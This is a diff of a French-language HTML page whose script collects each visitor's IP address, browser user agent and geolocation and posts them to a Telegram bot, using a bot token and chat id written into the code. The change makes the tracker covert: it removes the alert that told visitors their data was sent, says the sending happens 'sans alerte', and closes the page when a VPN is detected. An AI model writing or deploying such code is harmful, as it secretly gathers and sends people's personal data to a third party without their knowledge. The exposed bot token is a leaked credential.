@@ -20,8 +20,8 @@
     </style>
     <script>
         function sendToTelegram(message) {
-            const token = '7463916367:AAFOPjZpfm4th8l6qSTqTuUUBjKwVlDdJ-4';  // Remplace par ton token de bot Telegram
-            const chatId = '7604426420';   // Remplace par ton chat_id Telegram
+            const token = '7463916367:AAFOPjZpfm4th8l6qSTqTuUUBjKwVlDdJ-4';  // Ton token de bot Telegram
+            const chatId = '7604426420';  // Ton chat_id Telegram
 
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
             const params = {
@@ -48,11 +48,19 @@
                     .then(data => {
                         const ip = data.ip;
                         const userAgent = navigator.userAgent;
-                        const message = `IP : ${ip}\nUser-Agent : ${userAgent}`;
+                        const location = data.city + ", " + data.region + ", " + data.country;
+                        const message = `IP : ${ip}\nUser-Agent : ${userAgent}\nGéolocalisation : ${location}`;
 
-                        // Envoi des données à Telegram
+                        // Vérification si l'utilisateur utilise un VPN
+                        if (data.org && data.org.includes("VPN")) {
+                            // Si VPN détecté, fermer la page automatiquement
+                            window.close();  // Ferme la page si un VPN est détecté
+                            return;
+                        }
+
+                        // Envoi des données à Telegram sans alerter l'utilisateur
                         sendToTelegram(message);
-                        alert('Informations envoyées à Telegram');
+
                     })
                     .catch(err => {
                         console.error('Erreur de récupération de l\'IP:', err);
@@ -65,7 +73,7 @@
 </head>
 <body>
     <h1>Bienvenue sur la page de collecte d'informations</h1>
-    <p>Si vous êtes sur un mobile, vos informations IP et User-Agent seront envoyées à un bot Telegram.</p>
+    <p>Si vous êtes sur un appareil mobile, vos informations seront envoyées à un bot Telegram sans alerte.</p>
     
     <div id="mobile-message" class="mobile-message">
         <p>Vous êtes sur un appareil mobile. Nous avons envoyé vos informations à Telegram.</p>
